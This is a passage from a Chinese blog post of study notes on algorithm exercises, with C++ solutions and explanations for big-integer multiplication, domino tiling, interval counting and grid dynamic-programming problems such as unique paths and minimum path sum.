alt="image-20240305170045851"></p><h3 id="矩形容纳"><a href="#矩形容纳" class="headerlink" title="矩形容纳"></a>矩形容纳</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240306113921669.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240306113921669.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240306113921669"></p><p>n&#x2F;2*m&#x2F;2</p><h3 id="矩阵覆盖"><a href="#矩阵覆盖" class="headerlink" title="矩阵覆盖"></a>矩阵覆盖</h3><p>输出格式那打错了，应该是要覆盖需要的正方形个数</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240306135053348.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240306135053348.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240306135053348"></p><p>n为奇数则n&#x2F;2+1，n为偶数则n&#x2F;2。</p><h3 id="矩阵覆盖2"><a href="#矩阵覆盖2" class="headerlink" title="矩阵覆盖2"></a>矩阵覆盖2</h3><p><code>我们可以用2*1的小矩形横着或者竖着去覆盖更大的矩形。请问用n个2*1的小矩形无重叠地覆盖一个2*n的大矩形，总共有多少种方法？</code></p><p>根据两个矩形的形状可知，当第一次竖着放的时候，一共有多少方法取决于后面边长为2*(n-1)的矩形中小矩形的放法有多少种；当第一次横着放的时候，必须是横着放两个矩形，一共有多少种方法取决于后面边长为2*(n-2)的矩形中小矩形的放法有多少种。所以总共的放法有f(n)&#x3D;f(n-1)+f(n-2)。</p><p>f(1)&#x3D;1，f(2)&#x3D;2</p><p>斐波那契</p><h3 id="高精度乘法"><a href="#高精度乘法" class="headerlink" title="高精度乘法"></a>高精度乘法</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240306135856628.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240306135856628.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240306135856628"></p><p>最难的一道，难到你上网搜csdn和知乎搜出来的答案能看到你脑子爆炸。有三个难点：</p><p>怎么存储大整数？大整数怎么加法？大整数怎么乘法？</p><p>首先，可以用数组存大整数的每一位，用数组下标表示其位高。可以向string输入，然后减去字符<code>&#39;0&#39;</code>即可得到其每一位数字。</p><ul><li>大整数怎么乘？</li></ul><p>常规乘法是这样的：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/4083f30387fbfbd83c45498bdfe79c84.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/4083f30387fbfbd83c45498bdfe79c84.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>如果199×9，199×9，199×1再移位相加，就要用三个vector存储中间结果，麻烦且空间复杂度高</p><p>实际上199×9也是9×9,9×9,1×9的移位加，且各位乘个位必定位数在2以内。</p><p><code>A[i]×B[j]+上一轮的进位</code>就是本轮结果。个位数为C[i+j+1]，十位数为<code>C[i+j]+之前的进位</code>。</p><p>可能还是不能理解，模拟一下循环，如图：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/QQ%E5%9B%BE%E7%89%8720240307171933.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/QQ%E5%9B%BE%E7%89%8720240307171933.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="QQ图片20240307171933"></p><blockquote><p>重点：string A&#x3D;123456789，A[8]&#x3D;9，加减乘是从个位开始的，所以应该逆序</p><p>结果也是一样，比如9×9&#x3D;81，8应该存C[0]，1存C[1]。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//高精度乘法 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">pricisemultipy</span><span class="params">(string &amp;A,string &amp;B)</span></span>&#123;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">C</span><span class="params">(A.size()+B.size(),<span class="number">0</span>)</span></span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=A.<span class="built_in">size</span>()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=B.<span class="built_in">size</span>()<span class="number">-1</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line"><span class="type">int</span> sum = (A[i]-<span class="string">&#x27;0&#x27;</span>)*(B[j]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="type">int</span> result = sum + C[i+j+<span class="number">1</span>];<span class="comment">//加上一轮的进位</span></span><br><span class="line">C[i+j+<span class="number">1</span>] = result % <span class="number">10</span> ;<span class="comment">//个位 </span></span><br><span class="line">C[i+j] += result / <span class="number">10</span> ;<span class="comment">//十位，还要加上之前那个位置上有的数字</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string A,B;</span><br><span class="line">cin&gt;&gt;A&gt;&gt;B;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; C = <span class="built_in">pricisemultipy</span>(A,B);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;C.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">cout&lt;&lt;C[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>最后C数组从高到低就是结果。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240307172351451.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240307172351451.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240307172351451"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240307172420494.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240307172420494.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240307172420494"></p><blockquote><p>算法为了理解，去除了不必要的部分，比如去除高位0和输入0判断。</p><p>高精度除法大概率不考，考了也没人能写出来。这个算法请务必多写几遍</p></blockquote><h3 id="砍树修路"><a href="#砍树修路" class="headerlink" title="砍树修路"></a>砍树修路</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240307173936207.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240307173936207.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240307173936207"></p><p>用辅助数组Tree，访问到置为1，最后数0。</p><blockquote><p>易错点：不能int Tree[L+1];，变长数组不会报错但运算会出问题</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//砍树修路</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">remain</span><span class="params">(<span class="type">int</span> L,<span class="type">int</span> n,vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;a)</span></span>&#123;<span class="comment">//0~L的数组，访问到就置为1，最后为0的就是剩余树 </span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">Tree</span><span class="params">(L+<span class="number">1</span>)</span></span>;<span class="comment">//不能int Tree[L+1];，变长数组不会报错但运算会出问题 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=a[i][<span class="number">0</span>];j&lt;=a[i][<span class="number">1</span>];j++)&#123;</span><br><span class="line">Tree[j]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=L;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(Tree[i]==<span class="number">0</span>) sum++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> L,n;</span><br><span class="line">cin&gt;&gt;L&gt;&gt;n;</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">a</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; (<span class="number">2</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin&gt;&gt;a[i][<span class="number">0</span>]&gt;&gt;a[i][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;<span class="built_in">remain</span>(L,n,a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="letcode-amp-牛客dp-链表"><a href="#letcode-amp-牛客dp-链表" class="headerlink" title="letcode&amp;牛客dp+链表"></a>letcode&amp;牛客dp+链表</h2><h3 id="不同路径"><a href="#不同路径" class="headerlink" title="不同路径"></a>不同路径</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301105643910.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301105643910.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240301105643910"></p><p>先看递归解决：很明显从右下角开始思考，有从上和从左过来两种方式，即等于左和上路径条数之和。1*2，1*3….等很明显只有一条路径，即m or n一个为1，则返回1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">path</span><span class="params">(<span class="type">int</span> m,<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(m&gt;<span class="number">1</span>&amp;&amp;n&gt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">path</span>(m<span class="number">-1</span>,n)+<span class="built_in">path</span>(m,n<span class="number">-1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//1*2或者2*1或者1*6的路径选择都为1个 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> m,n;</span><br><span class="line">cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line">cout&lt;&lt;<span class="built_in">path</span>(m,n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很遗憾，递归不满足时间复杂度。</p><p>非递归解决：定义一个dp数组，记录每个格子的路径条数，即除一行一列外，每个格子的路径条数都等于上+左</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">path</span><span class="params">(<span class="type">int</span> m,<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> dp[m][n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j&gt;<span class="number">0</span>&amp;&amp;i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        dp[i][j]=dp[i<span class="number">-1</span>][j]+dp[i][j<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j]=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> m,n;</span><br><span class="line">cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line">cout&lt;&lt;<span class="built_in">path</span>(m,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301112745113.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301112745113.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240301112745113"></p><h3 id="障碍物版不同路径"><a href="#障碍物版不同路径" class="headerlink" title="障碍物版不同路径"></a>障碍物版不同路径</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301112906322.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301112906322.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240301112906322"></p><p>首先，怎么输入和传参二维数组？</p><p>不能直接向某个变量cin二维数组，只能先输入行和列，然后再逐个输入，传参就用vector，因为C++传参定长，不能使用<code>int[][] matrix</code>，而是<code>int matrix[][3]</code>这种，不如使用vector方便</p><p>其次，障碍物点到达它的路径条数为0，其余按照上个题目进行计算即可</p><blockquote><p>不能直接把数组传给vector，需要先进行类型转换：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[rows][cols] = &#123;&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将数组转换为 std::vector</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; matrix;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; rows; ++i) &#123;</span><br><span class="line">        matrix.<span class="built_in">push_back</span>(<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="built_in">begin</span>(arr[i]), <span class="built_in">end</span>(arr[i])));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></blockquote><p>注意：devC++的标准无法读取vector库，需要在编译选项-&gt;添加参数”–std&#x3D;c++11”</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301154601417.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301154601417.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240301154601417"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301154628495.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301154628495.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240301154628495"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">path</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; block)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> m=block.<span class="built_in">size</span>(),n=block[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(block[i][j]==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j&gt;<span class="number">0</span>&amp;&amp;i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j]+dp[i][j<span class="number">-1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[i][j]=<span class="number">1</span>;<span class="comment">//第一行或第一列</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j]=<span class="number">0</span>;<span class="comment">//有障碍物</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> rows,cols;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;请输入行数和列数：&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;rows&gt;&gt;cols;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">block</span>(rows,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(cols));</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;请依次输入矩阵：&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;rows;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;cols;j++)&#123;</span><br><span class="line">            cin&gt;&gt;block[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;左上到右下路径条数为：&quot;</span>&lt;&lt;<span class="built_in">path</span>(block);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>秒了</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301154356385.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301154356385.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240301154356385"></p><h3 id="最小路径和"><a href="#最小路径和" class="headerlink" title="最小路径和"></a>最小路径和</h3><p>太经典了，和回复祝顺利一样经典</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301155000648.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301155000648.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240301155000648"></p><p>根据上两道题，不难猜出每个位置的dp最小值为<code>min(上，左)+本块值</code>，第一行则只能<code>左+本块值</code>，第一列则只能<code>上+本块值</code>，秒了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">min</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&gt;m) <span class="keyword">return</span> m;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">path</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; block)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> m=block.<span class="built_in">size</span>(),n=block[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=block[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>&amp;&amp;j==<span class="number">0</span>)&#123;</span><br><span class="line">                dp[i][j]=dp[i<span class="number">-1</span>][j]+block[i][j];<span class="comment">//第一行</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">if</span>(j&gt;<span class="number">0</span>&amp;&amp;i==<span class="number">0</span>)&#123;</span><br><span class="line">                dp[i][j]=dp[i][j<span class="number">-1</span>]+block[i][j];<span class="comment">//第一列</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">if</span>(j&gt;<span class="number">0</span>&amp;&amp;i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                dp[i][j]=<span class="built_in">min</span>(dp[i][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j])+block[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> rows,cols;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;请输入行数和列数：&quot;</span>&lt;&lt;endl;</span><br><span class="line">    cin&gt;&gt;rows&gt;&gt;cols;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">block</span>(rows,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(cols));</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;请依次输入矩阵：&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;rows;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;cols;j++)&#123;</span><br><span class="line">            cin&gt;&gt;block[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;左上到右下最短路径和为：&quot;</span>&lt;&lt;<span class="built_in">path</span>(block);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301161828856.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301161828856.png" 